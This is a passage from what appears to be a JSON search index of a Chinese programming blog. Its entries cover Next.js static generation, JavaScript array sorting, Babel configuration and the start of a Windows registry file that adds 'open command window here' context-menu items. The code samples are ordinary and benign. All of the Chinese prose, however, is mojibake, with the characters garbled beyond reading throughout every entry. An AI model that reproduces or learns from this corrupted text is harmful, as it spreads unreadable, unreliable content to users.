key={product.id}\u0026gt;{product.name}\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} è¯¥å‡½æ•°ä¸ä¼šåŒ…å«åœ¨å®¢æˆ·ç«¯ JS åŒ…ä¸­ï¼Œå› æ­¤ç”šè‡³å¯ä»¥ç”¨äºç›´æ¥ä»æ•°æ®åº“ä¸­è·å–æ•°æ®ã€‚\nä¸ªäººè¯¦æƒ…é¡µé¢ - æ¯é¡¹ åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºåˆ—è¡¨é¡µé¢ä¸Šåˆ—å‡ºçš„æ¯ä¸ªäº§å“åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„è¯¦ç»†é¡µé¢ã€‚\nè¿™äº›é¡µé¢å¯ä»¥é€šè¿‡ç‚¹å‡»åˆ—è¡¨é¡µé¢ä¸Šçš„ç›¸åº”é¡¹ç›®æˆ–ç›´æ¥é€šè¿‡ä¸€äº›å…¶ä»–é€”å¾„æ¥è®¿é—®ã€‚\nå‡è®¾æˆ‘ä»¬æœ‰äº§å“ ID ä¸º 101,102 103 çš„äº§å“ï¼Œä¾æ­¤ç±»æ¨ã€‚ æˆ‘ä»¬éœ€è¦åœ¨è·¯ç”± /products/101ã€/products/102ã€/products/103 ç­‰å¤„æä¾›ä»–ä»¬çš„ä¿¡æ¯ã€‚\nä¸ºäº†åœ¨ Next.js çš„æ„å»ºæ—¶å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‡½æ•° getStaticPaths() ä¸åŠ¨æ€è·¯ç”±ç»“åˆä½¿ç”¨ã€‚\næˆ‘ä»¬éœ€è¦ä¸ºæ­¤åˆ›å»ºä¸€ä¸ªå…¬å…±é¡µé¢ç»„ä»¶ products/[id].js å¹¶å¯¼å‡ºå…¶ä¸­çš„å‡½æ•° getStaticPaths()ã€‚\nè¯¥å‡½æ•°å°†è¿”å›æ‰€æœ‰å¯èƒ½çš„äº§å“ IDï¼Œè¿™äº› ID å¯ç”¨äºåœ¨æ„å»ºæ—¶é¢„å‘ˆç°å•ä¸ªäº§å“é¡µé¢ã€‚\næ­¤å¤„å¯ç”¨çš„ä»¥ä¸‹ Next.js æ¡†æ¶æ˜¾ç¤ºäº†å¦‚ä½•ä¸ºæ­¤æ„å»ºä»£ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // pages/products/[id].js  // é¡µé¢/äº§å“/[id].js  // åœ¨ getStaticPaths() ä¸­ï¼Œéœ€è¦è¿”å›è¦åœ¨æ„å»ºæ—¶é¢„æ¸²æŸ“çš„äº§å“é¡µé¢ (/products/[id]) çš„ id åˆ—è¡¨ã€‚ // ä¸ºæ­¤ï¼Œå¯ä»¥ä»æ•°æ®åº“ä¸­è·å–æ‰€æœ‰äº§å“ã€‚ export async function getStaticPaths() { const products = await getProductsFromDatabase() const paths = products.map((product) =\u0026gt; ({ params: { id: product.id } })) // fallback: å›é€€ï¼šfalse æ„å‘³ç€æ²¡æœ‰æ­£ç¡® id çš„é¡µé¢å°† 404ã€‚  return { paths, fallback: false } } // params å°†åŒ…å«æ¯ä¸ªç”Ÿæˆé¡µé¢çš„ idã€‚ export async function getStaticProps({ params }) { return { props: { product: await getProductFromDatabase(params.id) } } } export default function Product({ product }) { // Render product }   äº§å“é¡µé¢ä¸Šçš„è¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨æ„å»ºæ—¶ä½¿ç”¨ç‰¹å®šäº§å“ ID çš„ getStaticProps å‡½æ•°å¡«å……ã€‚\næ³¨æ„è¿™é‡Œä½¿ç”¨ fallback: false æŒ‡æ ‡ã€‚ è¿™æ„å‘³ç€å¦‚æœæ²¡æœ‰å¯¹åº”ç‰¹å®šè·¯çº¿æˆ–äº§å“ ID çš„é¡µé¢å¯ç”¨ï¼Œåˆ™ä¼šæ˜¾ç¤º 404 é”™è¯¯é¡µé¢ã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SSG æ¥é¢„æ¸²æŸ“è®¸å¤šä¸åŒç±»å‹çš„é¡µé¢ã€‚\n\rSSG - å…³é”®æ³¨æ„äº‹é¡¹ å¦‚å‰æ‰€è¿°ï¼ŒSSG ä¸ºç½‘ç«™å¸¦æ¥äº†å‡ºè‰²çš„æ€§èƒ½ï¼Œå› ä¸ºå®ƒå‡å°‘äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ‰€éœ€çš„å¤„ç†ã€‚\nè¿™äº›ç½‘ç«™ä¹Ÿæ˜¯ SEO å‹å¥½çš„ï¼Œå› ä¸ºå†…å®¹å·²ç»å­˜åœ¨ï¼Œå¹¶ä¸”å¯ä»¥ç”±ç½‘ç»œçˆ¬è™«è½»æ¾å‘ˆç°ã€‚\nè™½ç„¶æ€§èƒ½å’Œ SEO ä½¿ SSG æˆä¸ºä¸€ç§å¾ˆå¥½çš„å‘ˆç°æ¨¡å¼ï¼Œä½†åœ¨è¯„ä¼° SSG å¯¹ç‰¹å®šåº”ç”¨ç¨‹åºçš„é€‚ç”¨æ€§æ—¶éœ€è¦è€ƒè™‘ä»¥ä¸‹å› ç´ ã€‚\n å¤§é‡ HTML æ–‡ä»¶ï¼š  éœ€è¦ä¸ºç”¨æˆ·å¯èƒ½è®¿é—®çš„æ¯æ¡å¯èƒ½è·¯çº¿ç”Ÿæˆå•ç‹¬çš„ HTML æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼Œå½“å°†å®ƒç”¨äºåšå®¢æ—¶ï¼Œå°†ä¸ºæ•°æ®å­˜å‚¨ä¸­å¯ç”¨çš„æ¯ä¸ªåšå®¢æ–‡ç« ç”Ÿæˆä¸€ä¸ª HTML æ–‡ä»¶ã€‚ éšåï¼Œå¯¹ä»»ä½•å¸–å­çš„ç¼–è¾‘éƒ½éœ€è¦é‡æ–°æ„å»ºï¼Œä»¥ä¾¿æ›´æ–°åæ˜ åœ¨é™æ€ HTML æ–‡ä»¶ä¸­ã€‚ ç»´æŠ¤å¤§é‡ HTML æ–‡ä»¶å¯èƒ½å…·æœ‰æŒ‘æˆ˜æ€§ã€‚\næ‰˜ç®¡ä¾èµ–ï¼š  å¯¹äº SSG ç«™ç‚¹æ¥è¯´ï¼Œè¦è¶…å¿«å’Œå¿«é€Ÿå“åº”ï¼Œç”¨äºå­˜å‚¨å’Œæä¾› HTML æ–‡ä»¶çš„æ‰˜ç®¡å¹³å°ä¹Ÿåº”è¯¥æ˜¯å¥½çš„ã€‚ å¦‚æœå°†ç»è¿‡è‰¯å¥½è°ƒæ•´çš„ SSG ç½‘ç«™æ‰˜ç®¡åœ¨å¤šä¸ª CDN ä¸Šä»¥åˆ©ç”¨è¾¹ç¼˜ç¼“å­˜ï¼Œåˆ™å¯èƒ½è·å¾—æœ€ä½³æ€§èƒ½ã€‚\nåŠ¨æ€å†…å®¹ï¼š  æ¯æ¬¡å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶ï¼Œéƒ½éœ€è¦æ„å»ºå’Œé‡æ–°éƒ¨ç½² SSG ç«™ç‚¹ã€‚ å¦‚æœåœ¨ä»»ä½•å†…å®¹æ›´æ”¹åå°šæœªæ„å»ºå’Œéƒ¨ç½²ç«™ç‚¹ï¼Œåˆ™æ˜¾ç¤ºçš„å†…å®¹å¯èƒ½ä¼šè¿‡æ—¶ã€‚ è¿™ä½¿å¾— SSG ä¸é€‚åˆé«˜åº¦åŠ¨æ€çš„å†…å®¹ã€‚\n\rçŸ¥è¯†ç‚¹  getStaticProps() getStaticPaths() åŠ¨æ€è·¯ç”±  ","description":"äº¤ä»˜åœ¨æ„å»ºç«™ç‚¹æ—¶ç”Ÿæˆçš„é¢„æ¸²æŸ“ HTML å†…å®¹","id":100,"section":"react-patterns","tags":null,"title":"é™æ€ç”Ÿæˆ","uri":"https://codthing.github.io/react-patterns/render-patterns/static-rendering/"},{"content":"sort() æ–¹æ³•å°±åœ°å¯¹æ•°ç»„çš„å…ƒç´ è¿›è¡Œæ’åºå¹¶è¿”å›æ’åºåçš„æ•°ç»„ã€‚ é»˜è®¤æ’åºé¡ºåºæ˜¯å‡åºï¼Œå»ºç«‹åœ¨å°†å…ƒç´ è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åæ¯”è¾ƒå®ƒä»¬çš„ UTF-16 ä»£ç å•å…ƒå€¼åºåˆ—çš„åŸºç¡€ä¸Šã€‚\næ’åºçš„æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦æ— æ³•ä¿è¯ï¼Œå› ä¸ºå®ƒå–å†³äºå®ç°ã€‚\n\rä½¿ç”¨ sort æ–¹æ³•æŒ‰å­—æ¯é¡ºåºç»™æ•°ç»„æ’åº sort æ–¹æ³•å¯ä»¥æ ¹æ®å›è°ƒå‡½æ•°å¯¹æ•°ç»„å…ƒç´ è¿›è¡Œæ’åºã€‚\n1 2 3 4 5 6 7 8  function ascendingOrder(arr) { return arr.sort(function(a, b) { return a - b; }); } ascendingOrder([1, 5, 2, 3, 4]); // [1, 2, 3, 4, 5]   1 2 3 4 5 6 7 8  function reverseAlpha(arr) { return arr.sort(function(a, b) { return a === b ? 0 : a \u0026lt; b ? 1 : -1; }); } reverseAlpha([\u0026#39;l\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;z\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;s\u0026#39;]); // [\u0026#39;z\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;b\u0026#39;]   JavaScript çš„é»˜è®¤æ’åºæ–¹æ³•æ˜¯ Unicode å€¼é¡ºåºæ’åºï¼Œæœ‰æ—¶å¯èƒ½ä¼šå¾—åˆ°æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚\nå› æ­¤ï¼Œå»ºè®®æä¾›ä¸€ä¸ªå›è°ƒå‡½æ•°æ¥æŒ‡å®šå¦‚ä½•å¯¹æ•°ç»„é¡¹ç›®æ’åºã€‚\nè¿™ä¸ªå›è°ƒå‡½æ•°é€šå¸¸å«åš compareFunctionï¼Œå®ƒæ ¹æ® compareFunction çš„è¿”å›å€¼å†³å®šæ•°ç»„å…ƒç´ çš„æ’åºæ–¹å¼ï¼š\n  å¦‚æœä¸¤ä¸ªå…ƒç´  a å’Œ bï¼ŒcompareFunction(a,b) è¿”å›ä¸€ä¸ªæ¯” 0 å°çš„å€¼ï¼Œé‚£ä¹ˆ a ä¼šåœ¨ b çš„å‰é¢ã€‚\n  å¦‚æœä¸¤ä¸ªå…ƒç´  a å’Œ bï¼ŒcompareFunction(a,b) è¿”å›ä¸€ä¸ªæ¯” 0 å¤§çš„å€¼ï¼Œé‚£ä¹ˆ b ä¼šåœ¨ a çš„å‰é¢ã€‚\n  å¦‚æœä¸¤ä¸ªå…ƒç´  a å’Œ bï¼ŒcompareFunction(a,b) è¿”å›ç­‰äº 0 çš„å€¼ï¼Œé‚£ä¹ˆ a å’Œ b çš„ä½ç½®ä¿æŒä¸å˜ã€‚\n  \råœ¨ alphabeticalOrder å‡½æ•°ä¸­ä½¿ç”¨ sort æ–¹æ³•å¯¹ arr ä¸­çš„å…ƒç´ æŒ‰ç…§å­—æ¯é¡ºåºæ’åˆ—ã€‚ è¯¥å‡½æ•°åº”è¿”å›ä¸€ä¸ªæ’åºçš„æ•°ç»„ã€‚\n1 2 3 4 5 6 7 8 9 10  function alphabeticalOrder(arr) { return arr.sort(function (a, b) { return a === b ? 0 : a \u0026lt; b ? -1 : 1; }); } alphabeticalOrder([\u0026#34;a\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;z\u0026#34;, \u0026#34;g\u0026#34;]); // [ \u0026#39;a\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;z\u0026#39; ]   \råœ¨ä¸æ›´æ”¹åŸå§‹æ•°ç»„çš„å‰æä¸‹è¿”å›æ’åºåçš„æ•°ç»„ sort æ–¹æ³•ä¼šäº§ç”Ÿæ”¹å˜åŸå§‹æ•°ç»„ä¸­å…ƒç´ é¡ºåºçš„å‰¯ä½œç”¨ã€‚\næ¢å¥è¯è¯´ï¼Œå®ƒä¼šæ”¹å˜æ•°ç»„çš„ä½ç½®ã€‚\né¿å…è¿™ç§æƒ…å†µçš„ä¸€ç§æ–¹æ³•æ˜¯å…ˆå°†ç©ºæ•°ç»„è¿æ¥åˆ°æ­£åœ¨æ’åºçš„æ•°ç»„ä¸Šï¼ˆè®°ä½ slice å’Œ concat è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ï¼‰ï¼Œå†ç”¨sortæ–¹æ³•ã€‚\nåœ¨ nonMutatingSort å‡½æ•°ä¸­ä½¿ç”¨ sort æ–¹æ³•å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æŒ‰å‡åºè¿›è¡Œæ’åˆ—ã€‚ å‡½æ•°ä¸èƒ½æ”¹å˜ globalArray å˜é‡ï¼Œåº”è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13  const globalArray = [5, 6, 3, 2, 9]; function nonMutatingSort(arr) { return [].concat(arr).sort(function (a, b) { return a - b; }); } nonMutatingSort(globalArray); // [ 2, 3, 5, 6, 9 ] console.log(globalArray); // [ 5, 6, 3, 2, 9 ]   ","description":"sort() æ–¹æ³•å°±åœ°å¯¹æ•°ç»„çš„å…ƒç´ è¿›è¡Œæ’åºå¹¶è¿”å›æ’åºåçš„æ•°ç»„ã€‚ é»˜è®¤æ’åºé¡ºåºæ˜¯å‡åºï¼Œå»ºç«‹åœ¨å°†å…ƒç´ è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åæ¯”è¾ƒå®ƒä»¬çš„ UTF-16 ä»£ç å•å…ƒå€¼åºåˆ—çš„åŸºç¡€ä¸Šã€‚","id":101,"section":"javascript","tags":null,"title":"Array.prototype.sort()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/sort-programming/"},{"content":"Babelæ˜¯Web Developerå·¥å…·é›†ä¸­çš„å‡ºè‰²æ¡ç›®ã€‚ è¿™æ˜¯ä¸€ä¸ªäº†ä¸èµ·çš„å·¥å…·ï¼Œå·²ç»å­˜åœ¨äº†ä¸€æ®µæ—¶é—´ï¼Œä½†æ˜¯å¦‚ä»Šå‡ ä¹æ¯ä¸ªJavaScriptå¼€å‘äººå‘˜éƒ½ä¾èµ–å®ƒï¼Œå¹¶ä¸”è¿™ç§æƒ…å†µå°†ç»§ç»­ä¸‹å»ï¼Œå› ä¸ºBabelç°åœ¨ä¸å¯æˆ–ç¼ºï¼Œå¹¶ä¸”å·²ç»è§£å†³äº†æ¯ä¸ªäººçš„å¤§éš¾é¢˜ã€‚\nå“ªä¸ªé—®é¢˜ï¼Ÿ\næ¯ä¸ªWebå¼€å‘äººå‘˜è‚¯å®šéƒ½æœ‰çš„é—®é¢˜ï¼šJavaScriptçš„åŠŸèƒ½åœ¨æœ€æ–°ç‰ˆæœ¬çš„æµè§ˆå™¨ä¸­å¯ç”¨ï¼Œä½†åœ¨è¾ƒæ—©çš„ç‰ˆæœ¬ä¸­ä¸å¯ç”¨ã€‚ ä¹Ÿè®¸Chromeæˆ–Firefoxå¯ä»¥å®ç°å®ƒï¼Œä½†Safari iOSå’ŒEdgeå´ä¸èƒ½ã€‚\nä¾‹å¦‚ï¼ŒES6å¼•å…¥äº†ç®­å¤´å‡½æ•°ï¼š\n[1, 2, 3].map((n) =\u0026gt; n + 1) ç°åœ¨æ‰€æœ‰ç°ä»£æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ã€‚ IE11ä¸æ”¯æŒå®ƒï¼Œä¹Ÿä¸æ”¯æŒOpera Miniï¼ˆæˆ‘æ€ä¹ˆçŸ¥é“ï¼Ÿé€šè¿‡æ£€æŸ¥ES6å…¼å®¹æ€§è¡¨ï¼‰ã€‚\né‚£ä¹ˆæ‚¨åº”è¯¥å¦‚ä½•å¤„ç†è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ æ‚¨åº”è¯¥ç»§ç»­å‰è¿›ï¼Œè®©é‚£äº›ä½¿ç”¨è¾ƒæ—§/ä¸å…¼å®¹æµè§ˆå™¨çš„å®¢æˆ·ç•™ä¸‹æ¥ï¼Œè¿˜æ˜¯åº”è¯¥ç¼–å†™è¾ƒæ—§çš„JavaScriptä»£ç ä½¿æ‰€æœ‰ç”¨æˆ·æ»¡æ„ï¼Ÿ\nè¾“å…¥Babelã€‚ Babelæ˜¯ä¸€ä¸ªç¼–è¯‘å™¨ï¼šå®ƒé‡‡ç”¨ä¸€ç§æ ‡å‡†ç¼–å†™çš„ä»£ç ï¼Œç„¶åå°†å…¶è½¬æ¢ä¸ºå¦ä¸€ç§æ ‡å‡†ç¼–å†™çš„ä»£ç ã€‚\næ‚¨å¯ä»¥é…ç½®Babelå°†ç°ä»£ES2017 JavaScriptè½¬æ¢ä¸ºJavaScript ES5è¯­æ³•ï¼š\n[1, 2, 3].map(function(n) {\rreturn n + 1\r}) è¿™å¿…é¡»åœ¨æ„å»ºæ—¶å‘ç”Ÿï¼Œå› æ­¤æ‚¨å¿…é¡»è®¾ç½®ä¸€ä¸ªå·¥ä½œæµç¨‹æ¥ä¸ºæ‚¨å¤„ç†ã€‚\nWebpackæ˜¯å¸¸è§çš„è§£å†³æ–¹æ¡ˆã€‚\nï¼ˆè¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯¹è¿™äº›ESäº‹æƒ…éƒ½æ„Ÿåˆ°å›°æƒ‘ï¼Œè¯·å‚é˜…ECMAScriptæŒ‡å—ä¸­æœ‰å…³ESç‰ˆæœ¬çš„æ›´å¤šä¿¡æ¯ï¼‰\nä¸€ã€å®‰è£…Babel ä½¿ç”¨npmå¯ä»¥å¾ˆå®¹æ˜“åœ°åœ¨é¡¹ç›®æœ¬åœ°å®‰è£…Babelï¼š\nnpm install --save-dev @babel/core @babel/cli è¿‡å»ï¼Œæˆ‘å»ºè®®åœ¨å…¨å±€èŒƒå›´å†…å®‰è£…babel-cliï¼Œä½†æ˜¯ç°åœ¨Babelç»´æŠ¤äººå‘˜ä¸å»ºè®®è¿™æ ·åšï¼Œå› ä¸ºé€šè¿‡åœ¨æœ¬åœ°ä½¿ç”¨babelï¼Œæ‚¨å¯ä»¥åœ¨æ¯ä¸ªé¡¹ç›®ä¸­ä½¿ç”¨ä¸åŒç‰ˆæœ¬çš„Babelï¼Œè€Œä¸”åœ¨å­˜å‚¨åº“ä¸­æ£€å…¥babelå¯¹äºå›¢é˜Ÿåˆä½œæ›´æœ‰åˆ©\nç”±äºnpmç°åœ¨éšnpxä¸€èµ·æä¾›ï¼Œå› æ­¤å¯ä»¥é€šè¿‡åœ¨é¡¹ç›®æ–‡ä»¶å¤¹ä¸­é”®å…¥å‘½ä»¤æ¥è¿è¡Œæœ¬åœ°å®‰è£…çš„CLIè½¯ä»¶åŒ…ï¼š\nnpx babel script.js äºŒã€Babelé…ç½®ç¤ºä¾‹ Babelå¼€ç®±å³ç”¨å¹¶æ²¡æœ‰åšä»»ä½•æœ‰ç”¨çš„äº‹æƒ…ï¼Œæ‚¨éœ€è¦å¯¹å…¶è¿›è¡Œé…ç½®å¹¶æ·»åŠ æ’ä»¶ã€‚\nè¿™æ˜¯Babelæ’ä»¶çš„åˆ—è¡¨\nä¸ºäº†è§£å†³æˆ‘ä»¬åœ¨ç®€ä»‹ä¸­è®¨è®ºçš„é—®é¢˜ï¼ˆåœ¨æ¯ä¸ªæµè§ˆå™¨ä¸­ä½¿ç”¨ç®­å¤´åŠŸèƒ½ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œ\nnpm install --save-dev @babel/plugin-transform-es2015-arrow-functions å°†è¯¥åŒ…ä¸‹è½½åˆ°æˆ‘ä»¬åº”ç”¨ç¨‹åºçš„node_modulesæ–‡ä»¶å¤¹ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ·»åŠ \n{\r\u0026#34;plugins\u0026#34;: [\u0026#34;transform-es2015-arrow-functions\u0026#34;]\r} åˆ°åº”ç”¨ç¨‹åºæ ¹æ–‡ä»¶å¤¹ä¸­å­˜åœ¨çš„.babelrcæ–‡ä»¶ã€‚ å¦‚æœè¿˜æ²¡æœ‰è¯¥æ–‡ä»¶ï¼Œåˆ™åªéœ€åˆ›å»ºä¸€ä¸ªç©ºç™½æ–‡ä»¶ï¼Œç„¶åå°†å…¶å†…å®¹æ”¾å…¥å…¶ä¸­ã€‚\næç¤ºï¼šå¦‚æœæ‚¨ä»æœªè§è¿‡ç‚¹æ–‡ä»¶ï¼ˆä»¥ç‚¹å¼€å¤´çš„æ–‡ä»¶ï¼‰ï¼Œä¹ä¸€çœ‹å¯èƒ½å¾ˆå¥‡æ€ªï¼Œå› ä¸ºè¯¥æ–‡ä»¶å¯èƒ½ä¸ä¼šå‡ºç°åœ¨æ–‡ä»¶ç®¡ç†å™¨ä¸­ï¼Œå› ä¸ºå®ƒæ˜¯éšè—æ–‡ä»¶ã€‚\nç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å«ä»¥ä¸‹å†…å®¹çš„script.jsæ–‡ä»¶ï¼š\nvar a = () =\u0026gt; {};\rvar a = (b) =\u0026gt; b;\rconst double = [1,2,3].map((num) =\u0026gt; num * 2);\rconsole.log(double); // [2,4,6]\rvar bob = {\r_name: \u0026#34;Bob\u0026#34;,\r_friends: [\u0026#34;Sally\u0026#34;, \u0026#34;Tom\u0026#34;],\rprintFriends() {\rthis._friends.forEach(f =\u0026gt;\rconsole.log(this._name + \u0026#34; knows \u0026#34; + f));\r}\r};\rconsole.log(bob.printFriends()); è¿è¡Œbabel script.jså°†è¾“å‡ºä»¥ä¸‹ä»£ç ï¼š\nvar a = function () {};var a = function (b) {\rreturn b;\r};\rconst double = [1, 2, 3].map(function (num) {\rreturn num * 2;\r});console.log(double); // [2,4,6]\rvar bob = {\r_name: \u0026#34;Bob\u0026#34;,\r_friends: [\u0026#34;Sally\u0026#34;, \u0026#34;Tom\u0026#34;],\rprintFriends() {\rvar _this = this;\rthis._friends.forEach(function (f) {\rreturn console.log(_this._name + \u0026#34; knows \u0026#34; + f);\r});\r}\r};\rconsole.log(bob.printFriends()); å¦‚æ‚¨æ‰€è§ï¼Œç®­å¤´å‡½æ•°å·²å…¨éƒ¨è½¬æ¢ä¸ºJavaScript ES5å‡½æ•°ã€‚\nä¸‰ã€Babelé¢„è®¾ æˆ‘ä»¬åˆšåˆšåœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°äº†å¦‚ä½•é…ç½®Babelæ¥è½¬æ¢ç‰¹å®šçš„JavaScriptå‡½æ•°ã€‚\næ‚¨å¯ä»¥æ·»åŠ æ›´å¤šçš„æ’ä»¶ï¼Œä½†æ˜¯ä¸èƒ½ä¸€ä¸€æ·»åŠ åˆ°é…ç½®åŠŸèƒ½ä¸­ï¼Œè¿™æ˜¯ä¸å®é™…çš„ã€‚\nè¿™å°±æ˜¯Babelæä¾›é¢„è®¾çš„åŸå› ã€‚\næœ€å—æ¬¢è¿çš„é¢„è®¾æ˜¯envå’Œreactã€‚\næç¤ºï¼šBabel 7å·²å¼ƒç”¨ï¼ˆå¹¶åˆ é™¤äº†ï¼‰æ¯å¹´çš„é¢„è®¾ï¼ˆä¾‹å¦‚preset-es2017å’Œèˆå°é¢„è®¾ï¼‰ã€‚ è¯·æ”¹ç”¨@babel/preset-envã€‚\nenvé¢„è®¾éå¸¸å¥½ï¼šæ‚¨å‘Šè¯‰å®ƒè¦æ”¯æŒå“ªäº›ç¯å¢ƒï¼Œå®ƒç¡®å®ä¸ºæ‚¨æä¾›æ‰€æœ‰åŠŸèƒ½ï¼Œå¹¶æ”¯æŒæ‰€æœ‰ç°ä»£JavaScriptåŠŸèƒ½ã€‚\nä¾‹å¦‚ã€‚ â€œæ”¯æŒæ¯ä¸ªæµè§ˆå™¨çš„æœ€å2ä¸ªç‰ˆæœ¬ï¼Œä½†å¯¹äºSafariï¼Œæ”¯æŒSafari 7ä¹‹åçš„æ‰€æœ‰ç‰ˆæœ¬ã€‚\n{\r\u0026#34;presets\u0026#34;: [\r[\u0026#34;env\u0026#34;, {\r\u0026#34;targets\u0026#34;: {\r\u0026#34;browsers\u0026#34;: [\u0026#34;last 2 versions\u0026#34;, \u0026#34;safari \u0026gt;= 7\u0026#34;]\r}\r}]\r]\r} æˆ–â€œä¸éœ€è¦æµè§ˆå™¨æ”¯æŒï¼Œåªéœ€ä½¿ç”¨Node.js 6.10â€\n{\r\u0026#34;presets\u0026#34;: [\r[\u0026#34;env\u0026#34;, {\r\u0026#34;targets\u0026#34;: {\r\u0026#34;node\u0026#34;: \u0026#34;6.10\u0026#34;\r}\r}]\r]\r} åœ¨ç¼–å†™Reactåº”ç”¨ç¨‹åºæ—¶ï¼Œreacté¢„è®¾éå¸¸æ–¹ä¾¿ï¼šæ·»åŠ é¢„è®¾preset-flowï¼Œsyntaxjsxï¼Œtransform-react-jsxï¼Œtransform-react-display-nameã€‚\né€šè¿‡åŒ…å«å®ƒï¼Œæ‚¨å·²ç»å‡†å¤‡å¥½ä½¿ç”¨JSXè½¬æ¢å’ŒFlowæ”¯æŒæ¥å¼€å‘Reactåº”ç”¨ç¨‹åºã€‚\næœ‰å…³é¢„è®¾çš„æ›´å¤šä¿¡æ¯\nhttps://babeljs.io/docs/plugins/\nå››ã€å°†Babelä¸Webpackä¸€èµ·ä½¿ç”¨ å¦‚æœæ‚¨æƒ³åœ¨æµè§ˆå™¨ä¸­è¿è¡Œç°ä»£JavaScriptï¼Œå•å‡­Babelæ˜¯ä¸å¤Ÿçš„ï¼Œæ‚¨è¿˜éœ€è¦bundleæ†ç»‘ä»£ç ã€‚ Webpackæ˜¯å®ç°æ­¤ç›®çš„çš„å®Œç¾å·¥å…·ã€‚\næç¤ºï¼šå¦‚æœæ‚¨ä¸ç†Ÿæ‚‰webpackï¼Œè¯·é˜…è¯»webpackæŒ‡å—\nç°ä»£JSéœ€è¦ä¸¤ä¸ªä¸åŒçš„é˜¶æ®µï¼šç¼–è¯‘é˜¶æ®µå’Œè¿è¡Œæ—¶é˜¶æ®µã€‚ è¿™æ˜¯å› ä¸ºæŸäº›ES6 +åŠŸèƒ½éœ€è¦polyfillæˆ–runtimeå¸®åŠ©ç¨‹åºã€‚\nè¦å®‰è£…Babel polyfillå’ŒruntimeåŠ©æ‰‹ï¼Œè¯·è¿è¡Œ\nnpm install @babel/polyfill @babel/runtime @babel/plugin-transform-runtime ç°åœ¨åœ¨æ‚¨çš„webpack.config.jsæ–‡ä»¶ä¸­æ·»åŠ ï¼š\nentry: [\r\u0026#39;babel-polyfill\u0026#39;,\r// your app scripts should be here\r],\rmodule: {\rloaders: [\r// Babel loader compiles ES2015 into ES5 for\r// complete cross-browser support\r{\rloader: \u0026#39;babel-loader\u0026#39;,\rtest: /\\.js$/,\r// only include files present in the `src` subdirectory\rinclude: [path.resolve(__dirname, \u0026#34;src\u0026#34;)],\r// exclude node_modules, equivalent to the above line\rexclude: /node_modules/,\rquery: {\r// Use the default ES2015 preset\r// to include all ES2015 features\rpresets: [\u0026#39;es2015\u0026#39;],\rplugins: [\u0026#39;transform-runtime\u0026#39;]\r}\r}\r]\r} é€šè¿‡å°†é¢„è®¾å’Œæ’ä»¶ä¿¡æ¯ä¿ç•™åœ¨webpack.config.jsæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…ä½¿ç”¨.babelrcæ–‡ä»¶ã€‚\näº”ã€Babel çš„ç¼ºé™· è½¬ç å½“ç„¶ä¼šæŸè€—æ€§èƒ½ï¼Œå¦‚æœè¿½æ±‚æè‡´æ€§èƒ½ï¼Œå¯æ’é™¤ã€‚\n","description":"","id":102,"section":"others","tags":null,"title":"Babel","uri":"https://codthing.github.io/others/babel/babel-base/"},{"content":"ç›´æ¥æ–°å»ºtxtï¼Œç²˜è´´è¿›å»ä¿å­˜ï¼Œç„¶åé€‰æ‹©å¦å­˜ä¸ºï¼Œä¿å­˜ç±»å‹é€‰æ‰€æœ‰æ–‡ä»¶ã€ç¼–ç é€‰ANSIã€æ–‡ä»¶åä¸ºCmdAndPowershellAll.reg(åå­—æ— æ‰€è°“ï¼Œåç¼€ä¸º.regå°±å¯ä»¥)ã€‚åŒå‡»å®‰è£…ã€‚\nWindows Registry Editor Version 5.00\r; åŸæ–‡é“¾æ¥ï¼š\r; https://blog.csdn.net/cxrsdn/article/details/84538767\r; è‹¥åŸå…ˆæœ‰ï¼Œå…ˆåˆ é™¤åŸæ¥çš„\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere]\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin]\r; 1.å³é”®ï¼šå‘½ä»¤è¡Œ\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere]\r@=\u0026#34;åœ¨æ­¤å¤„æ‰“å¼€å‘½ä»¤è¡Œçª—å£\u0026#34;\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere\\command]\r@=\u0026#34;cmd.exe -noexit -command Set-Location -literalPath 